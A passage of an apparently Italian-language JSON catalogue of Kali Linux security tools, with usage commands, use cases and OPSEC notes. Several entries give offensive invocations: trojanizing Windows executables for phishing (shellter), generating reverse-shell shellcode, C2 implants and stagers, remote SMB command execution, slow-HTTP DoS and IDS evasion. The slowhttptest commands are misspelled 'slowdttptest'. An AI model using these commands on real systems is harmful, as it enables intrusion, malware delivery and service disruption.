OPSEC</h4><p><strong>Detection:</strong> shellcode generato può essere rilevato da AV. <strong>Testing:</strong> utilizzare in ambienti controllati. <strong>Encoding:</strong> considerare tecniche di offuscamento.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "Payload_Generation"
    ],
    "notes": null
  },
  {
    "id": "shellter",
    "name": "shellter",
    "version": "7.2",
    "icon": "../app/icons/shellter-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/shellter/",
    "desc": "Inietta shellcode in PE Windows legittimi per bypass AV con tecniche polimorfiche.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Shellter è uno strumento di dynamic PE infection che inietta shellcode in eseguibili Windows legittimi. Utilizza tecniche polimorfiche e anti-debug per evadere antivirus mantenendo la funzionalità originale del PE.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Dynamic Injection:</strong> analizza execution flow e inietta in code caves</p><p><strong>Polymorphic Engine:</strong> genera varianti uniche per ogni infezione</p><p><strong>Stealth Mode:</strong> mantiene funzionalità originale del PE</p><p><strong>Custom Payload:</strong> supporta shellcode custom oltre a Metasploit</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia Shellter in modalità automatica\nshellter -a\n\n# Modalità interattiva (menu-driven)\nshellter\n\n# Workflow tipico:\n# 1. Selezionare PE target (putty.exe, 7z.exe)\n# 2. Scegliere payload (Meterpreter, shell)\n# 3. Configurare LHOST/LPORT\n# 4. Output: PE trojanizzato</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>AV bypass</strong>, crea payload che evadono signature-based detection. Per <strong>phishing</strong>, distribuisce malware mascherato da software legittimo. Per <strong>persistence</strong>, sostituisce eseguibili comuni con versioni trojanizzate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> behavioral analysis può rilevare l'attività post-injection. <strong>Signatures:</strong> PE modificati possono avere hash diversi. <strong>Reputation:</strong> download non firmati sono più sospetti.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "04_Red_Team",
      "Evasion"
    ],
    "notes": null
  },
  {
    "id": "sherlock",
    "name": "sherlock",
    "version": "0.15.0",
    "icon": "../app/icons/sherlock-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sherlock/",
    "desc": "Trova account social collegati a username su 400+ siti web e piattaforme online.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Sherlock è uno strumento OSINT che ricerca username su oltre 400 siti web e social network. Identifica account collegati a un'identità online analizzando la disponibilità del nome utente su diverse piattaforme.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Platform Search:</strong> verifica 400+ siti web simultaneamente</p><p><strong>Result Export:</strong> salva risultati in CSV, JSON, TXT</p><p><strong>Proxy Support:</strong> routing attraverso Tor o proxy HTTP</p><p><strong>Rate Limiting:</strong> controllo velocità per evitare blocchi</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Cerca username su tutti i siti\nsherlock username\n\n# Cerca multipli username\nsherlock user1 user2 user3\n\n# Output in CSV con timeout\nsherlock --csv --timeout 10 username\n\n# Usa Tor per anonimizzazione\nsherlock --tor username\n\n# Mostra solo risultati positivi\nsherlock --print-found username</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>OSINT investigation</strong>, mappa la presenza online di un target. Per <strong>digital footprint</strong>, identifica account associati a un'identità. Per <strong>due diligence</strong>, verifica profili social prima di assunzioni.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rate Limiting:</strong> ricerche aggressive possono causare ban IP. <strong>False Positives:</strong> omonimia richiede verifica manuale. <strong>Privacy:</strong> usare Tor per ricerche sensibili.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "People_Search"
    ],
    "notes": null
  },
  {
    "id": "sickle-tool",
    "name": "sickle-tool",
    "version": "3.1.0",
    "icon": "../app/icons/sickle-tool-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sickle-tool/",
    "desc": "Sviluppo shellcode: genera, formatta e analizza payload per exploit development.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Sickle è un payload development tool che aiuta nella creazione, formattazione e analisi di shellcode. Offre moduli per generazione, encoding e comparazione di payload con supporto per multiple architetture.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Payload Generation:</strong> crea shellcode per varie architetture</p><p><strong>Format Output:</strong> converte in C, Python, PowerShell, Ruby</p><p><strong>Bad Char Detection:</strong> identifica caratteri problematici nel payload</p><p><strong>Disassembly:</strong> analizza shellcode esistente</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Genera payload formattato in C\nsickle -p linux/x86/shell_reverse_tcp -f c\n\n# Controlla bad characters\nsickle -r payload.bin -b '\\x00\\x0a\\x0d'\n\n# Disassembla shellcode\nsickle -d -r payload.bin -a x86\n\n# Converti hex dump in formato Python\nsickle -f python -r raw_shellcode.bin</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>exploit development</strong>, prepara shellcode per buffer overflow. Per <strong>bad char analysis</strong>, identifica byte da evitare. Per <strong>format conversion</strong>, trasforma payload per diversi linguaggi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> payload standard sono rilevati da AV. <strong>Encoding:</strong> usare encoder per evadere signatures. <strong>Testing:</strong> verificare in ambiente controllato prima dell'uso.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "Payload_Generation"
    ],
    "notes": null
  },
  {
    "id": "sidguesser",
    "name": "sidguesser",
    "version": "1.0.5",
    "icon": "../app/icons/sidguesser-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sidguesser/",
    "desc": "Brute force SID Oracle Database per identificare istanze e database disponibili.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SIDGuesser è uno strumento per enumerare SID (System Identifier) di Oracle Database. Effettua brute force sul TNS listener per scoprire istanze database valide quando il listener non rivela direttamente questa informazione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>SID Brute Force:</strong> prova lista di SID comuni e custom</p><p><strong>TNS Interaction:</strong> comunica direttamente con Oracle TNS listener</p><p><strong>Wordlist Support:</strong> utilizza dizionari personalizzati</p><p><strong>Multi-target:</strong> scan di range di IP per Oracle</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Bruteforce SID con wordlist default\nsidguesser -i 192.168.1.100\n\n# Usa wordlist personalizzata\nsidguesser -i 192.168.1.100 -d custom_sids.txt\n\n# Specifica porta TNS listener\nsidguesser -i 192.168.1.100 -p 1521\n\n# Range di target\nsidguesser -i 192.168.1.0/24 -d sids.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Oracle enumeration</strong>, scopre database nascosti. Per <strong>pentest database</strong>, identifica target per attacchi successivi. Per <strong>inventory</strong>, mappa istanze Oracle in rete.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Logging:</strong> tentativi falliti possono essere loggati dal listener. <strong>Rumore:</strong> brute force genera traffico anomalo. <strong>Lockout:</strong> alcuni sistemi bloccano dopo troppi tentativi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "Database"
    ],
    "notes": null
  },
  {
    "id": "siege",
    "name": "siege",
    "version": "4.1.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/siege/",
    "desc": "HTTP load testing e benchmarking per stress test di applicazioni web.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Siege è uno strumento di HTTP load testing e benchmarking per valutare le performance di applicazioni web sotto stress. Simula accessi concorrenti per identificare limiti di capacità e colli di bottiglia.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Load Testing:</strong> simula utenti concorrenti multipli</p><p><strong>Benchmarking:</strong> misura throughput, latenza e availability</p><p><strong>URL File:</strong> testa multiple URL da file</p><p><strong>Session Simulation:</strong> mantiene cookie e sessioni</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Test di base con 25 utenti concorrenti\nsiege -c 25 http://target.com/\n\n# Benchmark per 60 secondi\nsiege -c 50 -t 60S http://target.com/\n\n# Test da file URL\nsiege -c 100 -f urls.txt\n\n# Con autenticazione\nsiege -c 10 --login user:pass http://target.com/admin</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>capacity planning</strong>, determina limiti del server web. Per <strong>stress testing</strong>, identifica comportamento sotto carico. Per <strong>performance tuning</strong>, valuta impatto di ottimizzazioni.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Authorization:</strong> solo su sistemi autorizzati. <strong>DoS Risk:</strong> può causare denial of service involontario. <strong>Logging:</strong> genera molte entry nei log del server.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "sigma-cli",
    "name": "sigma-cli",
    "version": "1.0.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sigma-cli/",
    "desc": "Converte regole Sigma in query per SIEM: Splunk, Elasticsearch, QRadar, ArcSight.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Sigma CLI è lo strumento per convertire regole Sigma (formato di detection universale) in query specifiche per vari SIEM e backend. Permette di scrivere regole una volta e deployarle su qualsiasi piattaforma.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Backend:</strong> converte per Splunk, Elastic, QRadar, ArcSight</p><p><strong>Rule Validation:</strong> verifica sintassi regole Sigma</p><p><strong>Pipeline Processing:</strong> applica trasformazioni a catena</p><p><strong>Batch Conversion:</strong> processa directory di regole</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Converti regola in query Splunk\nsigma convert -t splunk rule.yml\n\n# Converti per Elasticsearch\nsigma convert -t elasticsearch rule.yml\n\n# Converti tutte le regole di una directory\nsigma convert -t splunk -r rules_dir/\n\n# Valida regola Sigma\nsigma check rule.yml</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>blue team</strong>, implementa detection rules su SIEM aziendale. Per <strong>threat hunting</strong>, converte regole community per la propria infrastruttura. Per <strong>SOC automation</strong>, integra pipeline di detection CI/CD.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Tuning:</strong> regole generiche possono generare falsi positivi. <strong>Coverage:</strong> verificare copertura per il proprio ambiente. <strong>Testing:</strong> validare query generate prima del deployment.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Network_Forensics"
    ],
    "notes": null
  },
  {
    "id": "silenttrinity",
    "name": "silenttrinity",
    "version": "0.4.6dev~20200310",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/silenttrinity/",
    "desc": "Framework C2 con agent Python/Boo per operazioni red team con evasion avanzata.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SilentTrinity è un framework C2 post-exploitation che utilizza Python e Boo language per agent execution. Sfrutta .NET DLR per esecuzione in-memory evitando signature detection tradizionali.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>In-Memory Execution:</strong> nessun file su disco tramite .NET DLR</p><p><strong>Boo Language:</strong> scripting dinamico per moduli custom</p><p><strong>Multi-Protocol:</strong> HTTP/HTTPS/WMI/DNS per comunicazione</p><p><strong>Plugin System:</strong> moduli per credential theft, lateral movement</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia teamserver\nst teamserver --ip 0.0.0.0 --port 5000\n\n# Client connection\nst client --ip server_ip --port 5000\n\n# Genera stager\nlisteners\nuse http\nset BindIP 0.0.0.0\nstagers\nuse msbuild\ngenerate</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>red team ops</strong>, mantiene accesso persistente con evasion. Per <strong>lateral movement</strong>, esegue moduli su target compromessi. Per <strong>AV bypass</strong>, sfrutta esecuzione in-memory via .NET.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Signatures:</strong> framework noto, stager possono essere rilevati. <strong>Behavior:</strong> attività sospette su CLR sono monitorabili. <strong>Network:</strong> traffic analysis può identificare beacon patterns.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "skipfish",
    "name": "skipfish",
    "version": "2.10b",
    "icon": "../app/icons/skipfish-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/skipfish/",
    "desc": "Web scanner attivo ad alte prestazioni per mapping e vulnerability assessment.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Skipfish è uno scanner web ad alte prestazioni sviluppato da Google. Effettua crawling e security assessment automatico di applicazioni web generando report HTML interattivi con vulnerabilità identificate.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>High Performance:</strong> oltre 2000 request/secondo con C asincrono</p><p><strong>Adaptive Crawling:</strong> riconoscimento automatico di strutture web</p><p><strong>Vulnerability Detection:</strong> XSS, SQL injection, directory traversal</p><p><strong>HTML Reporting:</strong> report interattivi con sitemap visuale</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan base con output directory\nskipfish -o output_dir http://target.com/\n\n# Con autenticazione\nskipfish -o output -A user:pass http://target.com/\n\n# Usa wordlist per directory brute\nskipfish -o output -W wordlist.txt http://target.com/\n\n# Limita scope\nskipfish -o output -I /app/ http://target.com/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>web assessment</strong>, mappa e testa applicazioni web. Per <strong>security audit</strong>, identifica vulnerabilità comuni. Per <strong>compliance</strong>, verifica sicurezza prima del go-live.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rumore:</strong> genera molto traffico, facilmente rilevabile. <strong>Logging:</strong> richieste loggabili dal web server. <strong>Authorization:</strong> solo su target autorizzati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "sleuthkit",
    "name": "sleuthkit",
    "version": "4.12.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sleuthkit/",
    "desc": "Suite forensics per analisi filesystem: timeline, file recovery, metadata extraction.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>The Sleuth Kit (TSK) è una suite di tool forensi open source per analisi di filesystem e volumi. Include strumenti CLI per file recovery, timeline analysis, metadata extraction e supporta numerosi filesystem.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Filesystem Analysis:</strong> NTFS, FAT, EXT, HFS+, APFS</p><p><strong>Timeline Creation:</strong> mactime genera timeline eventi</p><p><strong>File Recovery:</strong> recupera file cancellati da slack space</p><p><strong>Metadata Extraction:</strong> analizza MFT, inode, directory entries</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Lista partizioni di un'immagine\nmmls disk.img\n\n# Elenca file in filesystem\nfls -r -o 2048 disk.img\n\n# Estrai file specifico per inode\nicat -o 2048 disk.img 12345 > recovered_file\n\n# Crea timeline\nfls -m '/' -r -o 2048 disk.img > body\nmactime -b body > timeline.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>digital forensics</strong>, analizza dischi in indagini. Per <strong>incident response</strong>, recupera file cancellati da malware. Per <strong>timeline analysis</strong>, ricostruisce sequenza eventi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Write Blocking:</strong> usare sempre write blocker su evidence originale. <strong>Chain of Custody:</strong> documentare ogni operazione. <strong>Imaging:</strong> lavorare sempre su copie forensi.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "sliver",
    "name": "sliver",
    "version": "1.5.42",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sliver/",
    "desc": "Framework C2 moderno con implant Go cross-platform, mTLS, WireGuard e pivoting.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Sliver è un framework C2 open source sviluppato da BishopFox. Offre implant cross-platform in Go, supporto multi-operatore, comunicazioni cifrate via mTLS/WireGuard e capacità avanzate di pivoting.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Cross-Platform Implants:</strong> Windows, Linux, macOS in Go</p><p><strong>Encrypted Comms:</strong> mTLS, WireGuard, HTTP(S), DNS</p><p><strong>Multiplayer:</strong> supporto team multi-operatore</p><p><strong>Pivoting:</strong> TCP/UDP pivots, port forwarding, SOCKS5</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia server Sliver\nsliver-server\n\n# Genera implant\ngenerate --mtls host:443 --os windows --arch amd64\n\n# Avvia listener mTLS\nmtls --lhost 0.0.0.0 --lport 443\n\n# Interagisci con sessione\nuse [session_id]\ninfo\nps\nexecute-assembly seatbelt.exe</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>red team engagement</strong>, gestisce operazioni C2 complesse. Per <strong>adversary simulation</strong>, emula TTPs realistiche. Per <strong>pivoting</strong>, naviga attraverso reti segmentate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Signatures:</strong> implant Go hanno caratteristiche riconoscibili. <strong>Network:</strong> traffic patterns analizzabili. <strong>Memory:</strong> reflective loading può essere detectato da EDR.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "slowhttptest",
    "name": "slowhttptest",
    "version": "1.9.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/slowhttptest/",
    "desc": "Simula attacchi Slowloris e slow HTTP per testare resilienza server web a DoS.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SlowHTTPTest è uno strumento per simulare attacchi slow HTTP DoS. Testa la resilienza dei server web contro Slowloris, Slow POST, Slow Read e Apache Range Header attacks consumando risorse con connessioni lente.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Slowloris:</strong> mantiene connessioni aperte con header parziali</p><p><strong>Slow POST:</strong> invia body molto lentamente</p><p><strong>Slow Read:</strong> legge response con window size minimo</p><p><strong>Statistics:</strong> genera report HTML con metriche</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Test Slowloris\nslowdttptest -c 1000 -H -i 10 -r 200 -t GET -u http://target.com/\n\n# Test Slow POST\nslowdttptest -c 1000 -B -i 10 -r 200 -u http://target.com/login\n\n# Test Slow Read\nslowdttptest -c 1000 -X -r 200 -w 10 -y 20 -u http://target.com/\n\n# Con output HTML\nslowdttptest -c 500 -H -o report -u http://target.com/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>resilience testing</strong>, valuta capacità del server di gestire slow attacks. Per <strong>WAF testing</strong>, verifica protezioni anti-DoS. Per <strong>capacity planning</strong>, identifica limiti di connessione.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Authorization:</strong> solo su sistemi propri o autorizzati. <strong>Impact:</strong> può causare denial of service reale. <strong>Detection:</strong> facilmente rilevabile da WAF e IDS moderni.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "smbmap",
    "name": "smbmap",
    "version": "1.10.7",
    "icon": "../app/icons/smbmap-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/smbmap/",
    "desc": "Enumera share SMB, permessi, file e consente upload/download/execution remota.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SMBMap è uno strumento per enumerazione e interazione con share SMB. Elenca share accessibili, permessi, contenuti e permette operazioni come download, upload ed esecuzione remota di comandi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Share Enumeration:</strong> lista share e permessi (read/write)</p><p><strong>File Operations:</strong> download, upload, delete file remoti</p><p><strong>Command Execution:</strong> esecuzione comandi via SMB</p><p><strong>Recursive Listing:</strong> elenca contenuti ricorsivamente</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumera share con null session\nsmbmap -H 192.168.1.100\n\n# Con credenziali\nsmbmap -H 192.168.1.100 -u user -p password\n\n# Lista ricorsiva di uno share\nsmbmap -H 192.168.1.100 -u user -p pass -r share$\n\n# Download file\nsmbmap -H 192.168.1.100 -u user -p pass --download 'share$/file.txt'\n\n# Esegui comando\nsmbmap -H 192.168.1.100 -u admin -p pass -x 'whoami'</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>AD enumeration</strong>, mappa share accessibili nel dominio. Per <strong>data exfil</strong>, identifica file sensibili sugli share. Per <strong>lateral movement</strong>, trova share scrivibili per payload.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Logging:</strong> accessi SMB loggati nei Security logs. <strong>Failed Auth:</strong> tentativi falliti generano eventi 4625. <strong>Execution:</strong> -x crea processi visibili.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SMB"
    ],
    "notes": null
  },
  {
    "id": "smtp-user-enum",
    "name": "smtp-user-enum",
    "version": "1.2",
    "icon": "../app/icons/smtp-user-enum-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/smtp-user-enum/",
    "desc": "Enumera utenti validi su server SMTP via VRFY, EXPN e RCPT TO per harvesting.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SMTP-User-Enum è uno strumento per enumerare utenti validi su server SMTP. Utilizza i comandi VRFY, EXPN e RCPT TO per verificare l'esistenza di indirizzi email basandosi sulle risposte del server.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>VRFY Method:</strong> verifica diretta esistenza utente</p><p><strong>EXPN Method:</strong> espande mailing list e alias</p><p><strong>RCPT TO Method:</strong> deduce esistenza da response codes</p><p><strong>Wordlist Attack:</strong> testa lista di username comuni</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumeration con VRFY\nsmtp-user-enum -M VRFY -U users.txt -t mail.target.com\n\n# Enumeration con RCPT TO\nsmtp-user-enum -M RCPT -U users.txt -t mail.target.com\n\n# Con dominio specifico\nsmtp-user-enum -M RCPT -U users.txt -D target.com -t mail.target.com\n\n# Singolo utente\nsmtp-user-enum -M VRFY -u admin -t mail.target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>email harvesting</strong>, raccoglie indirizzi validi per phishing. Per <strong>user enumeration</strong>, identifica account esistenti. Per <strong>password attacks</strong>, prepara target list per spray.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Logging:</strong> tentativi loggati dai mail server. <strong>Rate Limiting:</strong> molti server limitano query. <strong>Hardening:</strong> server moderni disabilitano VRFY/EXPN.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Email_Harvesting"
    ],
    "notes": null
  },
  {
    "id": "sn0int",
    "name": "sn0int",
    "version": "0.26.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sn0int/",
    "desc": "Framework OSINT semi-automatico con database locale e moduli per recon avanzata.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Sn0int è un framework OSINT semi-automatico con database locale per gestione dati raccolti. Offre moduli per reconnaissance, correlazione entità e supporta scripting custom in Lua per automazione.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Entity Management:</strong> traccia domini, IP, email, persone</p><p><strong>Module System:</strong> moduli Lua per varie fonti OSINT</p><p><strong>Data Correlation:</strong> collega entità tra loro automaticamente</p><p><strong>Registry:</strong> repository pubblico di moduli community</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia workspace\nsn0int workspace myinvestigation\n\n# Aggiungi dominio target\nadd domain target.com\n\n# Installa modulo\npkg install dns/sublist3r\n\n# Esegui modulo\nrun dns/sublist3r\n\n# Visualizza risultati\nselect * from subdomains</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>OSINT investigation</strong>, raccoglie e correla dati su target. Per <strong>bug bounty</strong>, scopre asset e sottodomini. Per <strong>threat intelligence</strong>, mappa infrastruttura di attori malevoli.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Queries:</strong> alcuni moduli generano traffico identificabile. <strong>API Keys:</strong> gestire con cura credenziali per servizi esterni. <strong>Data Storage:</strong> database locale contiene dati sensibili.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "sniffjoke",
    "name": "sniffjoke",
    "version": "0.4.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sniffjoke/",
    "desc": "Offusca traffico di rete per eludere IDS/IPS con tecniche di evasion TCP/IP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SniffJoke è uno strumento di evasione che offusca il traffico di rete per eludere IDS/IPS. Inietta pacchetti malformati e utilizza tecniche TCP/IP per confondere i sistemi di analisi mantenendo la connessione valida.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Packet Injection:</strong> inietta pacchetti spuri per confondere IDS</p><p><strong>TCP Evasion:</strong> sfrutta ambiguità nello stack TCP/IP</p><p><strong>Transparent Proxy:</strong> opera come proxy trasparente</p><p><strong>Plugin System:</strong> varie tecniche di evasione modulari</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia SniffJoke con configurazione default\nsniffjoke\n\n# Specifica interfaccia\nsniffjoke -i eth0\n\n# Modalità debug\nsniffjoke -d\n\n# Con plugin specifico\nsniffjoke --plugin fragmentation</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>IDS evasion</strong>, bypassa detection durante assessment. Per <strong>red team</strong>, nasconde traffico malevolo. Per <strong>research</strong>, testa efficacia di sistemi di detection.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> IDS moderni riconoscono pattern di evasion. <strong>Performance:</strong> può degradare velocità connessione. <strong>Compatibility:</strong> alcune tecniche non funzionano con tutti i target.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "Evasion"
    ],
    "notes": null
  },
  {
    "id": "snmpcheck",
    "name": "snmpcheck",
    "version": "1.9",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/snmpcheck/",
    "desc": "Enumera informazioni SNMP da dispositivi di rete: interfacce, routing, processi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SNMPCheck è uno strumento per enumerazione SNMP che estrae informazioni dettagliate da dispositivi di rete. Raccoglie dati su interfacce, routing tables, processi in esecuzione, software installato e configurazioni.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Device Enumeration:</strong> hostname, contatti, location, uptime</p><p><strong>Interface Info:</strong> IP, MAC, statistiche traffico</p><p><strong>Routing Tables:</strong> gateway, next-hop, metriche</p><p><strong>Process/Software:</strong> lista processi e programmi installati</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Enumeration base con community public\nsnmpcheck -t 192.168.1.1\n\n# Con community string custom\nsnmpcheck -t 192.168.1.1 -c private\n\n# SNMPv3 con credenziali\nsnmpcheck -t 192.168.1.1 -v 3 -u user -l authPriv -a MD5 -A pass -x DES -X pass\n\n# Output verboso\nsnmpcheck -t 192.168.1.1 -v -c public</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>network enumeration</strong>, mappa dispositivi e configurazioni. Per <strong>vulnerability assessment</strong>, identifica sistemi con SNMP weak. Per <strong>inventory</strong>, raccoglie info su hardware/software.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Community Strings:</strong> default strings sono banali. <strong>Logging:</strong> query SNMP possono essere loggate. <strong>Security:</strong> SNMPv1/v2 trasmettono in chiaro.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SNMP"
    ],
    "notes": null
  },
  {
    "id": "snmpenum",
    "name": "snmpenum",
    "version": "0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/snmpenum/",
    "desc": "Script Perl per enumeration SNMP con query OID comuni per device discovery.",
